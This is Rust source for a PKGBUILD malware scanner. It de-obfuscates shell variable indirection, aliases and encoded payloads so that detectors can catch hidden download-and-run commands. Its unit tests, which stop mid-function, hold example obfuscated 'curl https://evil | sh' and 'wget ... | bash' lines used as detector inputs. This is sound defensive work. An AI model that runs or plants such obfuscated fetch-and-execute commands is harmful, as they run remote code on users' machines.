/// Purely static, size-bounded, and run at most two levels deep. Returns `None`
/// when nothing decoded.
fn decode_inline_payloads(line: &str) -> Option<String> {
    // Every decoder needs one of these words; most lines have none, and the
    // regexes below are comparatively costly.
    if !["base64", "xxd", "printf"].iter().any(|k| line.contains(k)) {
        return None;
    }
    let mut cur = line.to_string();
    let mut changed = false;
    for _ in 0..2 {
        let mut round = false;
        for (re, hex) in [
            (&*B64_PIPE_RE, false),
            (&*B64_HERE_RE, false),
            (&*HEX_PIPE_RE, true),
        ] {
            let next = re
                .replace_all(&cur, |c: &regex::Captures| {
                    let dec = if hex {
                        decode_hex(&c[1])
                    } else {
                        decode_b64(&c[1])
                    };
                    dec.unwrap_or_else(|| c[0].to_string())
                })
                .into_owned();
            if next != cur {
                cur = next;
                round = true;
            }
        }
        let next = PRINTF_ESC_PIPE_RE
            .replace_all(&cur, |c: &regex::Captures| {
                if ESC_COUNT_RE.find_iter(&c[1]).count() < 4 {
                    return c[0].to_string();
                }
                match accept_decoded(decode_printf_format(&c[1]).into_bytes()) {
                    Some(d) => format!("{d} |"),
                    None => c[0].to_string(),
                }
            })
            .into_owned();
        if next != cur {
            cur = next;
            round = true;
        }
        if !round {
            break;
        }
        changed = true;
    }
    changed.then_some(cur)
}

/// Drop a leading declaration keyword / control word / function header so the
/// assignment (if any) is at the front of the statement. Returns the remainder
/// and whether a declaration keyword (`local`/`declare`/…) was present.
pub(crate) fn statement_head(stmt: &str) -> (&str, bool) {
    let mut s = stmt.trim_start();
    loop {
        if let Some(m) = CTRL_RE.find(s) {
            s = s[m.end()..].trim_start();
        } else if let Some(m) = FN_RE.find(s) {
            if m.end() == 0 {
                break;
            }
            s = s[m.end()..].trim_start();
        } else {
            break;
        }
    }
    let stripped = strip_decl_prefix(s);
    (stripped, stripped.len() != s.len())
}

/// Matches the start of a function definition statement and captures its name.
static FN_NAME_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"^\s*(?:function\s+)?([A-Za-z_][A-Za-z0-9_:-]*)\s*\(\s*\)|^\s*function\s+([A-Za-z_][A-Za-z0-9_:-]*)")
        .unwrap()
});

/// Most distinct call sites of one helper function we resolve its positional
/// parameters for.
const MAX_CALL_VARIANTS: usize = 4;

/// What a first pass learns about the file.
#[derive(Default)]
struct PassFacts {
    /// Top-level variables at end of file.
    globals: HashMap<String, String>,
    /// Variables assigned inside functions without `local`: they become global
    /// once the function runs, which we cannot order, so they are only offered
    /// to a second pass.
    leaks: HashMap<String, String>,
    /// Literal-argument call sites of the functions defined in the file.
    calls: HashMap<String, Vec<Vec<Option<String>>>>,
}

struct Scope<'a> {
    /// Effective variables at this point (globals overlaid by function locals).
    vars: HashMap<String, String>,
    /// Top-level (global) variables only.
    globals: HashMap<String, String>,
    in_func: bool,
    /// Names declared `local` in the current function.
    locals: HashSet<String>,
    /// Non-local assignments made inside functions.
    leaks: HashMap<String, String>,
    /// Names never assigned anywhere in the package files.
    unset: &'a HashSet<String>,
}

fn base_name(key: &str) -> &str {
    key.split('[').next().unwrap_or(key)
}

impl Scope<'_> {
    fn set(&mut self, name: &str, val: String) {
        if !self.in_func {
            self.globals.insert(name.to_string(), val.clone());
        } else if !self.locals.contains(base_name(name)) {
            self.leaks.insert(name.to_string(), val.clone());
        }
        self.vars.insert(name.to_string(), val);
    }

    fn forget(&mut self, name: &str) {
        let prefix = format!("{name}[");
        let keys: Vec<String> = self
            .vars
            .keys()
            .chain(self.globals.keys())
            .filter(|k| k.as_str() == name || k.starts_with(&prefix))
            .cloned()
            .collect();
        for k in keys {
            if !self.in_func {
                self.globals.remove(&k);
            }
            self.vars.remove(&k);
            self.leaks.remove(&k);
        }
    }

    /// Store an array: first element as `$name`, the whole list as
    /// `${name[@]}`, each element as `${name[i]}`.
    fn set_array(&mut self, name: &str, elems: &[String]) {
        self.forget(name);
        let joined = elems.join(" ");
        if joined.len() > MAX_VALUE_LEN || elems.len() > MAX_ARRAY_ELEMS {
            return;
        }
        self.set(name, elems.first().cloned().unwrap_or_default());
        self.set(&format!("{name}[@]"), joined);
        self.set(&format!("{name}[#]"), elems.len().to_string());
        for (i, e) in elems.iter().enumerate() {
            self.set(&format!("{name}[{i}]"), e.clone());
        }
    }

    /// Current elements of array `name`, when fully tracked.
    fn array_elems(&self, name: &str) -> Option<Vec<String>> {
        let n: usize = self.vars.get(&format!("{name}[#]"))?.parse().ok()?;
        (0..n)
            .map(|i| self.vars.get(&format!("{name}[{i}]")).cloned())
            .collect()
    }

    fn rhs(&self, raw: &str) -> Option<String> {
        resolve_rhs(raw, &self.vars, self.unset)
    }

    /// Record one `name=value` / `name+=value` assignment (value still raw
    /// shell text).
    fn assign(&mut self, name: &str, rhs: &str, append: bool) {
        if name == "IFS" {
            match self.rhs(rhs) {
                Some(v) => self.set(IFS_KEY, v),
                None => self.forget(IFS_KEY),
            }
            return;
        }
        if is_build_var(name) {
            return;
        }
        let rhs = rhs.trim();
        if let Some(inner) = rhs.strip_prefix('(') {
            // Array assignment: `cmd=(curl -s URL)`. Track the first element as
            // `$cmd` and the whole list as `${cmd[@]}`.
            let Some(inner) = inner.strip_suffix(')') else {
                self.forget(name);
                return;
            };
            let elems: Option<Vec<String>> =
                split_words(inner).iter().map(|w| self.rhs(w)).collect();
            match elems {
                Some(mut e) => {
                    if append {
                        match self.array_elems(name) {
                            Some(mut old) => {
                                old.append(&mut e);
                                e = old;
                            }
                            None => {
                                self.forget(name);
                                return;
                            }
                        }
                    }
                    self.set_array(name, &e);
                }
                None => self.forget(name),
            }
            return;
        }
        let Some(v) = self.rhs(rhs) else {
            // Unresolvable RHS: forget any stale value so a later use is not
            // resolved to an outdated constant (fail toward raw).
            self.forget(name);
            return;
        };
        if append {
            // `c+=pm` extends the old value; an unassigned name starts empty.
            let old = match self.vars.get(name) {
                Some(o) => o.clone(),
                None if self.unset.contains(name) => String::new(),
                None => {
                    self.forget(name);
                    return;
                }
            };
            let joined = format!("{old}{v}");
            if joined.len() > MAX_VALUE_LEN {
                self.forget(name);
            } else {
                self.set(name, joined);
            }
        } else {
            self.set(name, v);
        }
    }

    /// `printf -v NAME FMT ARG…`, `read [-r] NAME… <<< text`,
    /// `mapfile|readarray [-t] NAME <<< text` and `alias NAME=VALUE`.
    /// Returns true when the statement was one of those (it is not an
    /// assignment list).
    fn track_builtin(&mut self, words: &[String]) -> bool {
        let Some(cmd) = words.first().map(String::as_str) else {
            return false;
        };
        match cmd {
            "printf" if words.get(1).map(String::as_str) == Some("-v") => {
                let Some(name) = words.get(2) else {
                    return true;
                };
                let mut synth = vec!["printf".to_string()];
                synth.extend(words[3..].iter().cloned());
                match fold_printf(&synth) {
                    Some(v) => self.assign(name, &format!("'{}'", v.replace('\'', "")), false),
                    None => self.forget(name),
                }
                true
            }
            "read" | "mapfile" | "readarray" => {
                let here = words.iter().position(|w| w == "<<<");
                let end = here.unwrap_or(words.len());
                let names: Vec<&String> = words[1..end]
                    .iter()
                    .filter(|w| !w.starts_with('-'))
                    .filter(|w| w.chars().all(|c| c.is_ascii_alphanumeric() || c == '_'))
                    .collect();
                // `read -p PROMPT NAME` style flags with arguments: give up.
                let value = here.and_then(|p| {
                    let text = words[p + 1..].join(" ");
                    self.rhs(&text)
                });
                match (cmd, value) {
                    ("read", Some(v)) if !names.is_empty() => {
                        let mut rest = v.trim_start();
                        for (i, n) in names.iter().enumerate() {
                            let piece = if i + 1 == names.len() {
                                let r = rest.trim_end();
                                rest = "";
                                r
                            } else {
                                let (a, b) =
                                    rest.split_once(char::is_whitespace).unwrap_or((rest, ""));
                                rest = b.trim_start();
                                a
                            };
                            self.assign(n, &format!("'{}'", piece.replace('\'', "")), false);
                        }
                    }
                    ("mapfile" | "readarray", Some(v)) if names.len() == 1 => {
                        let lines: Vec<String> = v
                            .split('\n')
                            .filter(|l| !l.is_empty())
                            .map(str::to_string)
                            .collect();
                        self.set_array(names[0], &lines);
                    }
                    _ => {
                        for n in names {
                            self.forget(n);
                        }
                    }
                }
                true
            }
            "alias" => {
                for w in &words[1..] {
                    if let Some((n, v)) = w.split_once('=') {
                        match self.rhs(v) {
                            Some(val) => {
                                self.vars.insert(format!("{ALIAS_PREFIX}{n}"), val.clone());
                                if !self.in_func {
                                    self.globals.insert(format!("{ALIAS_PREFIX}{n}"), val);
                                }
                            }
                            None => {
                                self.vars.remove(&format!("{ALIAS_PREFIX}{n}"));
                            }
                        }
                    }
                }
                true
            }
            _ => false,
        }
    }

    /// Track the assignments in one statement (`a=1`, `local a=1 b=2`,
    /// `export x=curl`). `VAR=x cmd args` is a per-command environment, not an
    /// assignment, and is ignored.
    fn track(&mut self, stmt: &str) {
        let (head, had_decl) = statement_head(stmt);
        let words = split_words(head);
        if !had_decl && self.track_builtin(&words) {
            return;
        }
        // `head` is a suffix of `stmt`, so the text before it holds the
        // declaration keyword(s).
        let prefix = &stmt[..stmt.len() - head.len()];
        let is_local = self.in_func
            && had_decl
            && prefix
                .split_whitespace()
                .any(|w| matches!(w, "local" | "declare" | "typeset"))
            && !prefix
                .split_whitespace()
                .any(|w| w.starts_with('-') && w.contains('g'));
        let mut assigns: Vec<(String, String, bool)> = Vec::new();
        let mut idx = 0;
        while idx < words.len() {
            match ASSIGN_RE.captures(&words[idx]) {
                Some(c) => assigns.push((c[1].to_string(), c[3].to_string(), !c[2].is_empty())),
                None => break,
            }
            idx += 1;
        }
        let rest = &words[idx..];
        if had_decl {
            // `local x` (no value) shadows any outer value.
            for w in rest {
                if w.chars().all(|c| c.is_ascii_alphanumeric() || c == '_') && !w.is_empty() {
                    if is_local {
                        self.locals.insert(w.clone());
                    }
                    self.forget(w);
                }
            }
        } else if !rest.is_empty() || assigns.is_empty() {
            return;
        }
        for (name, rhs, append) in assigns {
            if is_local {
                self.locals.insert(name.clone());
            }
            self.assign(&name, &rhs, append);
        }
    }
}

/// Expand a leading `{a,b,c}` word (a brace list at command position) into the
/// space-separated words the shell would run.
fn expand_leading_brace(stmt: &str) -> String {
    let t = stmt.trim_start();
    let lead = &stmt[..stmt.len() - t.len()];
    let Some(body) = t.strip_prefix('{') else {
        return stmt.to_string();
    };
    let Some(close) = body.find('}') else {
        return stmt.to_string();
    };
    let list = &body[..close];
    let after = &body[close + 1..];
    if list.is_empty()
        || !list.contains(',')
        || list.contains(|c: char| c.is_whitespace() || matches!(c, '{' | '$' | '`' | '\'' | '"'))
        || !(after.is_empty() || after.starts_with(char::is_whitespace))
    {
        return stmt.to_string();
    }
    format!(
        "{lead}{}{after}",
        list.split(',').collect::<Vec<_>>().join(" ")
    )
}

/// Replace a leading alias name (`alias zz=npm` earlier) with its value.
fn expand_alias(stmt: &str, vars: &HashMap<String, String>) -> String {
    let t = stmt.trim_start();
    let lead = &stmt[..stmt.len() - t.len()];
    let end = t.find(char::is_whitespace).unwrap_or(t.len());
    match vars.get(&format!("{ALIAS_PREFIX}{}", &t[..end])) {
        Some(v) => format!("{lead}{v}{}", &t[end..]),
        None => stmt.to_string(),
    }
}

/// Set (or clear) the positional parameters `$1..$9`, `$@`, `$*` in `vars`.
fn set_positionals(vars: &mut HashMap<String, String>, args: Option<&[Option<String>]>) {
    for i in 1..=9 {
        vars.remove(&i.to_string());
    }
    vars.remove("@");
    vars.remove("*");
    let Some(args) = args else { return };
    for (i, a) in args.iter().enumerate().take(9) {
        if let Some(a) = a {
            vars.insert((i + 1).to_string(), a.clone());
        }
    }
    if args.iter().all(Option::is_some) {
        let all = args.iter().flatten().cloned().collect::<Vec<_>>().join(" ");
        vars.insert("@".into(), all.clone());
        vars.insert("*".into(), all);
    }
}

/// Name of the function a statement defines, if it is a definition header.
fn defined_fn(stmt: &str) -> Option<String> {
    if !stmt.contains('(') && !stmt.contains("function") {
        return None;
    }
    let t = stmt.trim_start();
    let t = CTRL_RE.find(t).map_or(t, |m| t[m.end()..].trim_start());
    FN_NAME_RE
        .captures(t)
        .and_then(|c| c.get(1).or_else(|| c.get(2)))
        .map(|m| m.as_str().to_string())
}

/// One flow-ordered pass. `prior`, when given, is what the first pass learned:
/// makepkg sources the WHOLE PKGBUILD before it runs any function, so a function
/// body sees every top-level assignment regardless of where in the file it sits
/// relative to the function (and, once a helper has run, the variables it set).
/// It also carries the literal call sites of helper functions so their `$1`..
/// can be resolved.
fn resolve_pass(
    logical: &[(usize, String)],
    prior: Option<&PassFacts>,
    unset: &HashSet<String>,
) -> (HashMap<usize, String>, PassFacts) {
    let mut scope = Scope {
        vars: HashMap::new(),
        globals: HashMap::new(),
        in_func: false,
        locals: HashSet::new(),
        leaks: HashMap::new(),
        unset,
    };
    // Variables visible inside function bodies on the second pass.
    let func_globals: Option<HashMap<String, String>> = prior.map(|p| {
        let mut g = p.globals.clone();
        for (k, v) in &p.leaks {
            g.entry(k.clone()).or_insert_with(|| v.clone());
        }
        g
    });
    let mut resolved_at: HashMap<usize, String> = HashMap::new();
    let mut scanner = BraceScanner::default();
    let mut calls: HashMap<String, Vec<Vec<Option<String>>>> = HashMap::new();
    // Functions currently open (innermost last), each with its own brace scanner.
    let mut fn_stack: Vec<(String, BraceScanner)> = Vec::new();
    let fn_names: HashSet<String> = logical
        .iter()
        .filter(|(_, l)| l.contains('(') || l.contains("function"))
        .flat_map(|(_, l)| split_statements(l))
        .filter_map(|(s, _)| defined_fn(&s))
        .collect();

    for (start_line, logical_line) in logical {
        // A function header starts a fresh local scope seeded with the globals,
        // so an assignment in one function never bleeds into another.
        if !scope.in_func && FN_RE.is_match(logical_line) {
            scope.in_func = true;
            scope.vars = func_globals
                .clone()
                .unwrap_or_else(|| scope.globals.clone());
            scope.locals.clear();
            scanner = BraceScanner::default();
        }
        let stmts = split_statements(logical_line);
        if let Some(first) = stmts.first().and_then(|(s, _)| defined_fn(s)) {
            fn_stack.push((first, BraceScanner::default()));
        }
        let cur_fn = fn_stack.last().map(|(n, _)| n.clone());
        let call_sets: Vec<Vec<Option<String>>> = match (prior, &cur_fn) {
            (Some(p), Some(f)) => p
                .calls
                .get(f)
                .map(|c| c.iter().take(MAX_CALL_VARIANTS).cloned().collect())
                .unwrap_or_default(),
            _ => Vec::new(),
        };
        set_positionals(&mut scope.vars, call_sets.first().map(Vec::as_slice));

        let mut emitted = String::with_capacity(logical_line.len());
        for (stmt, sep) in &stmts {
            let sub = substitute_vars(stmt, &scope.vars, unset);
            let sub = expand_alias(&expand_leading_brace(&sub), &scope.vars);
            emitted.push_str(&sub);
            emitted.push_str(sep);
            // Record literal-argument calls to functions defined in this file.
            if fn_names.contains(&first_word(stmt)) && defined_fn(stmt).is_none() {
                let (head, _) = statement_head(stmt);
                let words = split_words(head);
                let args: Vec<Option<String>> = words
                    .get(1..)
                    .unwrap_or_default()
                    .iter()
                    .map(|w| {
                        // Only single plain words: a quoted sentence handed to a
                        // `msg "…"` printer helper is text, not a command.
                        resolve_rhs(w, &scope.vars, unset).filter(|v| {
                            !v.is_empty()
                                && v.chars()
                                    .all(|c| c.is_ascii_alphanumeric() || "_./:+@%=,-".contains(c))
                        })
                    })
                    .collect();
                let entry = calls.entry(words[0].clone()).or_default();
                if entry.len() < MAX_CALL_VARIANTS && !entry.contains(&args) {
                    entry.push(args);
                }
            }
            scope.track(stmt);
        }
        // Further call sites of the enclosing helper yield further variants of
        // the same line (substitution only: tracking already ran).
        let mut variants = vec![emitted.clone()];
        for args in call_sets.iter().skip(1) {
            let mut v = scope.vars.clone();
            set_positionals(&mut v, Some(args));
            let text: String = stmts
                .iter()
                .map(|(s, sep)| {
                    let sub = substitute_vars(s, &v, unset);
                    format!("{}{sep}", expand_alias(&expand_leading_brace(&sub), &v))
                })
                .collect();
            if !variants.contains(&text) {
                variants.push(text);
            }
        }
        if variants.len() > 1 {
            let joined = variants.join(" ; ");
            if joined.len() <= MAX_DECODED_LEN {
                emitted = joined;
            }
        }
        set_positionals(&mut scope.vars, None);

        // Variants that are not variable uses: `${IFS}` word separators and
        // short inline-encoded payloads.
        let emitted_ifs = if emitted.contains("IFS") {
            IFS_RE.replace_all(&emitted, " ").into_owned()
        } else {
            emitted
        };
        let emitted = decode_inline_payloads(&emitted_ifs).unwrap_or(emitted_ifs);
        if emitted != *logical_line {
            // Quote-normalize like the de-obfuscation pass, so a resolved
            // `"$c" url | "$s"` reads as `curl url | sh`.
            let normalized = normalize_shell_quoting(&emitted);
            resolved_at.insert(
                *start_line,
                if normalized.is_empty() {
                    emitted
                } else {
                    normalized
                },
            );
        }

        for (_, sc) in fn_stack.iter_mut() {
            sc.feed(logical_line);
        }
        while fn_stack
            .last()
            .is_some_and(|(_, sc)| sc.peak > 0 && sc.depth <= 0)
        {
            fn_stack.pop();
        }
        if scope.in_func {
            scanner.feed(logical_line);
            if scanner.peak > 0 && scanner.depth <= 0 {
                scope.in_func = false;
                scope.vars = scope.globals.clone();
            }
        }
    }
    (
        resolved_at,
        PassFacts {
            globals: scope.globals,
            leaks: scope.leaks,
            calls,
        },
    )
}

/// First word of a statement (after control words / declaration prefixes).
fn first_word(stmt: &str) -> String {
    let (head, _) = statement_head(stmt);
    head.split_whitespace().next().unwrap_or("").to_string()
}

/// Resolve statically-evident variable indirection in `content`, returning a
/// line-count-preserving text (so analyzers that report a line number still
/// point at the right physical line). The result is matched *in addition to* the
/// raw content by the detection pipeline.
///
/// Scoping follows makepkg: top-level assignments are global and visible inside
/// every function (the whole file is sourced before any function runs), while an
/// assignment inside a function stays local to it. Variables a function sets
/// without `local` are offered to the other functions on a second pass.
/// Several assignments or commands on one line (`c=curl; s=sh; $c url | $s`)
/// are processed in order, and `local a=1 b=2`, `cmd=(curl -s URL)` /
/// `"${cmd[@]}"`, `c+=x`, `printf -v`, `read`/`mapfile <<<`, aliases, brace
/// lists, parameter-expansion operators (`${v:1:3}`, `${v//a/b}`, `${v#p}`,
/// `${v,,}`, `${v:-d}`), a helper's `$1`.. when called with literal arguments,
/// and `${IFS}` separators are understood. Short inline base64/hex payloads are
/// spliced back as the command text they decode to (see
/// `decode_inline_payloads`).
///
/// Continuation lines are spliced (via [`logical_lines`]) so an assignment or use
/// split across a `\`-newline is still resolved; the resolved logical line is
/// emitted on its starting physical line and any continuation physical lines are
/// emitted blank to preserve the total line count.
pub fn resolve_variables(content: &str) -> String {
    // Several analyzers (and the function index) resolve the same PKGBUILD text
    // in one scan; on a large file each pass costs seconds. A few recent results
    // are kept and matched by exact text, so a hit is always the right answer.
    static CACHE: std::sync::Mutex<Vec<(String, String)>> = std::sync::Mutex::new(Vec::new());
    const CACHE_ENTRIES: usize = 4;
    // Small inputs resolve in microseconds; do not hold their text.
    const MIN_CACHED_LEN: usize = 16 * 1024;
    let cacheable = content.len() >= MIN_CACHED_LEN;
    if cacheable {
        if let Ok(c) = CACHE.lock() {
            if let Some((_, out)) = c.iter().find(|(k, _)| k == content) {
                return out.clone();
            }
        }
    }
    let out = resolve_variables_uncached(content);
    if cacheable {
        if let Ok(mut c) = CACHE.lock() {
            if c.len() >= CACHE_ENTRIES {
                c.remove(0);
            }
            c.push((content.to_string(), out.clone()));
        }
    }
    out
}

fn resolve_variables_uncached(content: &str) -> String {
    let total_lines = content.lines().count();
    let logical = logical_lines(content);
    let unset = unset_names(content);
    // Pass 1 collects the end-of-file globals and call sites; pass 2 emits with
    // them visible inside function bodies.
    let (_, facts) = resolve_pass(&logical, None, &unset);
    let (resolved_at, _) = resolve_pass(&logical, Some(&facts), &unset);

    // Re-emit physical lines, substituting the resolved logical variant on its
    // start line and blanking the spliced continuation lines.
    let continuation_lines = continuation_line_set(&logical, content);
    let mut out: Vec<String> = Vec::with_capacity(total_lines);
    for (idx, phys) in content.lines().enumerate() {
        let lineno = idx + 1;
        if let Some(resolved) = resolved_at.get(&lineno) {
            // A substituted value can carry line breaks (`printf 'a\nb'`
            // decodes to two lines). Emitting them verbatim shifted every later
            // resolved line down, so callers that align by line number matched
            // each line against the wrong variant and lost the last ones off the
            // end: one `x=$(printf 'a\nb\nc')` plus a use of `$x` hid a
            // `$c URL | sh` below it entirely. Flatten the breaks into command
            // separators, as the inline-payload decoder already does, so the
            // output keeps exactly one line per input line.
            out.push(resolved.replace(['\r', '\n'], "; "));
        } else if continuation_lines.contains(&lineno) {
            // This physical line was spliced into a logical line emitted above;
            // blank it to keep the 1:1 line count without duplicating content.
            out.push(String::new());
        } else {
            out.push(phys.to_string());
        }
    }
    out.join("\n")
}

/// A statement that sources a file: `. file`, `source file`, optionally quoted
/// and prefixed with `$srcdir/`, `$startdir/` or `./`.
static SOURCE_STMT_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r#"^\s*(?:\.|source)\s+["']?(?:\$\{?(?:srcdir|startdir)\}?/(?:src/)?|\./)?([A-Za-z0-9_.-]+)["']?\s*(?:;|$)"#,
    )
    .unwrap()
});

/// The plain `NAME=value` statements of a sourced local file, joined with `; `.
fn sidecar_assignments(content: &str) -> String {
    let mut out: Vec<String> = Vec::new();
    for (_, line) in logical_lines(content) {
        for (stmt, _) in split_statements(&line) {
            let words = split_words(stmt.trim());
            if !words.is_empty() && words.iter().all(|w| ASSIGN_RE.is_match(w)) {
                out.push(stmt.trim().to_string());
            }
        }
    }
    out.join("; ")
}

/// Variant of `content` where each `. sidecar` / `source sidecar` of a local
/// file shipped with the package gets that file's plain assignments appended on
/// the same line (line count unchanged), so a command hidden behind variables
/// defined in the sidecar (`$_f URL | $_s` after `. "$srcdir/vars.conf"`)
/// resolves. `sidecars` is `(file name, content)`. `None` when nothing applied.
pub fn inline_sourced_assignments(content: &str, sidecars: &[(String, String)]) -> Option<String> {
    if sidecars.is_empty() {
        return None;
    }
    let mut changed = false;
    let lines: Vec<String> = content
        .lines()
        .map(|line| {
            let Some(c) = SOURCE_STMT_RE.captures(line) else {
                return line.to_string();
            };
            let Some((_, body)) = sidecars.iter().find(|(n, _)| n == &c[1]) else {
                return line.to_string();
            };
            let assigns = sidecar_assignments(body);
            if assigns.is_empty() || assigns.len() > MAX_DECODED_LEN {
                return line.to_string();
            }
            changed = true;
            format!("{}; {assigns}", line.trim_end().trim_end_matches(';'))
        })
        .collect();
    changed.then(|| lines.join("\n"))
}

/// Most functions one entry function's call graph walk visits. Past it the
/// bodies still queued are appended raw (unresolved): the text is an extra
/// variant, so including less resolution can never hide a finding.
const MAX_FUNCS_PER_ENTRY: usize = 256;
/// Deepest helper-of-helper chain whose bodies are variable-resolved; deeper
/// helpers are still included, raw.
const MAX_CALL_DEPTH: usize = 3;
/// Total bytes of helper text handed out across all entries of one file, so a
/// file with thousands of entry functions cannot multiply its own size.
const MAX_HELPER_TEXT_TOTAL: usize = 8 * 1024 * 1024;

/// Per-file index for [`FunctionIndex::text_for`]: variables resolved once, the
/// function spans found once, and the command words of every function body
/// tokenized once, so asking for many entry functions does not redo that work.
pub struct FunctionIndex {
    resolved: Vec<String>,
    raw: Vec<String>,
    spans: HashMap<String, (usize, usize)>,
    /// Function name -> the command-like words its body contains.
    words: HashMap<String, HashSet<String>>,
    /// The same for the unresolved text, used to keep walking past the caps.
    raw_words: HashMap<String, HashSet<String>>,
    budget: std::cell::Cell<usize>,
}

/// Split a body into the words that could be a command name: delimited by
/// whitespace, `;`, `&`, `|`, parentheses, backticks and `{`.
fn command_words(body: &str) -> HashSet<String> {
    body.split(|c: char| c.is_whitespace() || matches!(c, ';' | '&' | '|' | '(' | ')' | '`' | '{'))
        .filter(|w| !w.is_empty())
        .map(str::to_string)
        .collect()
}

impl FunctionIndex {
    pub fn new(content: &str) -> Self {
        let resolved_full = resolve_variables(content);
        let resolved: Vec<String> = resolved_full.lines().map(str::to_string).collect();
        let raw: Vec<String> = content.lines().map(str::to_string).collect();
        let spans = function_spans(content);
        let words = spans
            .iter()
            .map(|(name, &(s, e))| {
                let body = slice_lines(&resolved, s, e);
                (name.clone(), command_words(&body))
            })
            .collect();
        let raw_words = spans
            .iter()
            .map(|(name, &(s, e))| (name.clone(), command_words(&slice_lines(&raw, s, e))))
            .collect();
        Self {
            resolved,
            raw,
            spans,
            words,
            raw_words,
            budget: std::cell::Cell::new(MAX_HELPER_TEXT_TOTAL),
        }
    }

    /// Resolved text of function `name` (variables substituted, inline-encoded
    /// payloads decoded) followed by the resolved text of every top-level helper
    /// function it calls, transitively (cycle-safe; resolved up to a few levels deep and
    /// for the first couple of hundred functions, raw beyond that, within a size
    /// budget). Lets a check that is scoped to
    /// `build()`/`package()` also see a payload that lives in a helper defined
    /// at the top level and merely CALLED from there.
    pub fn text_for(&self, name: &str) -> String {
        let mut out = String::new();
        let mut seen: HashSet<&str> = HashSet::new();
        let mut queue: std::collections::VecDeque<(&str, usize)> =
            std::collections::VecDeque::new();
        queue.push_back((name, 0));
        let mut resolved_count = 0;
        while let Some((fname, depth)) = queue.pop_front() {
            if self.budget.get() == 0 {
                break;
            }
            if !seen.insert(fname) {
                continue;
            }
            let Some(&(s, e)) = self.spans.get(fname) else {
                continue;
            };
            // The whole transitive closure is walked (a helper chain cannot hide
            // a payload by being long). Near the entry, bodies are variable
            // resolved; past the depth or width cap they are appended raw.
            let resolve_it = depth <= MAX_CALL_DEPTH && resolved_count < MAX_FUNCS_PER_ENTRY;
            let words = if resolve_it {
                resolved_count += 1;
                self.push(&mut out, &slice_lines(&self.resolved, s, e));
                self.words.get(fname)
            } else {
                self.push(&mut out, &slice_lines(&self.raw, s, e));
                self.raw_words.get(fname)
            };
            if let Some(words) = words {
                // Sorted so which helpers fall past the cap does not depend on
                // hash order.
                let mut called: Vec<&str> = words
                    .iter()
                    .filter(|w| !seen.contains(w.as_str()))
                    .filter_map(|w| self.spans.get_key_value(w.as_str()))
                    .map(|(k, _)| k.as_str())
                    .collect();
                called.sort_unstable();
                queue.extend(called.into_iter().map(|c| (c, depth + 1)));
            }
        }
        out
    }

    fn push(&self, out: &mut String, text: &str) {
        self.budget
            .set(self.budget.get().saturating_sub(text.len() + 1));
        out.push_str(text);
        out.push('\n');
    }
}

fn slice_lines(lines: &[String], s: usize, e: usize) -> String {
    lines
        .get(s.saturating_sub(1)..e.min(lines.len()))
        .unwrap_or(&[])
        .join("\n")
}

/// One-shot form of [`FunctionIndex::text_for`]; callers that ask for several
/// functions of one file should build a [`FunctionIndex`] once instead.
pub fn resolved_function_text(content: &str, name: &str) -> String {
    FunctionIndex::new(content).text_for(name)
}

/// `name -> (first physical line, last physical line)` (1-based, inclusive) for
/// each function definition in `content`.
fn function_spans(content: &str) -> HashMap<String, (usize, usize)> {
    static NAME_RE: LazyLock<Regex> = LazyLock::new(|| {
        Regex::new(r"^\s*(?:function\s+)?([A-Za-z_][A-Za-z0-9_:-]*)\s*(?:\(\s*\))?\s*\{?").unwrap()
    });
    let mut spans = HashMap::new();
    let mut cur: Option<(String, usize, BraceScanner)> = None;
    let total = content.lines().count();
    let logical = logical_lines(content);
    for (i, (phys, line)) in logical.iter().enumerate() {
        if cur.is_none() && FN_RE.is_match(line) {
            if let Some(c) = NAME_RE.captures(line) {
                cur = Some((c[1].to_string(), *phys, BraceScanner::default()));
            }
        }
        if let Some((name, start, sc)) = cur.as_mut() {
            sc.feed(line);
            if sc.peak > 0 && sc.depth <= 0 {
                let end = logical.get(i + 1).map_or(total, |(p, _)| p - 1).max(*phys);
                spans.insert(name.clone(), (*start, end));
                cur = None;
            }
        }
    }
    spans
}

/// The set of physical line numbers that are *continuation* lines (the 2nd+
/// physical line of a multi-physical-line logical line). Used to blank them in
/// the resolved output so the line count is preserved exactly once.
fn continuation_line_set(
    logical: &[(usize, String)],
    content: &str,
) -> std::collections::HashSet<usize> {
    // Recompute physical spans: a logical line starting at `start` spans until
    // the next logical line's start. The start lines are the non-continuation
    // lines; everything else is a continuation.
    let total = content.lines().count();
    let starts: std::collections::HashSet<usize> = logical.iter().map(|(s, _)| *s).collect();
    (1..=total).filter(|n| !starts.contains(n)).collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn resolve(s: &str) -> String {
        resolve_variables(s)
    }

    // --- command-name indirection -----------------

    #[test]
    fn resolves_simple_command_alias() {
        // x=curl; $x https://evil/p | sh  -> the resolved variant exposes curl|sh
        let out = resolve("x=curl\n$x https://evil/p | sh");
        assert!(out.contains("curl https://evil/p | sh"), "got: {out}");
    }

    #[test]
    fn resolves_brace_and_indirect_forms() {
        let out = resolve("c=wget\n${c} https://evil/p -O- | bash");
        assert!(out.contains("wget https://evil/p -O- | bash"), "got: {out}");
    }

    #[test]
    fn resolves_printf_hex_command_substitution() {
        // c=$(printf '\x63url'); $c https://evil | sh
        let out = resolve(
            r"c=$(printf '\x63url')\n$c https://evil | sh"
                .replace("\\n", "\n")
                .as_str(),
        );
        assert!(out.contains("curl https://evil | sh"), "got: {out}");
    }

    #[test]
    fn resolves_quote_split_assignment() {
        // c="cu""rl"; $c https://evil | sh   (the assignment itself is obfuscated)
        let out = resolve("c=\"cu\"\"rl\"\n$c https://evil | sh");
        assert!(out.contains("curl https://evil | sh"), "got: {out}");
    }

    #[test]
    fn resolves_indirect_expansion() {
        // a=curl; b=a; ${!b} https://evil | sh   (${!b} == $curl-name == curl)
        let out = resolve("a=curl\nb=a\n${!b} https://evil | sh");
        assert!(out.contains("curl https://evil | sh"), "got: {out}");
    }

    #[test]
    fn resolves_chained_constants() {
        let out = resolve("a=cur\nb=${a}l\n$b https://evil | sh");
        assert!(out.contains("curl https://evil | sh"), "got: {out}");
    }

    #[test]
    fn resolves_eval_of_variable() {
        let out = resolve("p=\"curl https://evil | sh\"\neval $p");
        assert!(out.contains("eval curl https://evil | sh"), "got: {out}");
    }

    // --- conservatism / no-FP ------------------------------------------------

    #[test]
    fn does_not_resolve_build_vars() {
        // $srcdir / $pkgver are makepkg-controlled and never tracked, so a normal
        // build line is unchanged (no spurious resolution).
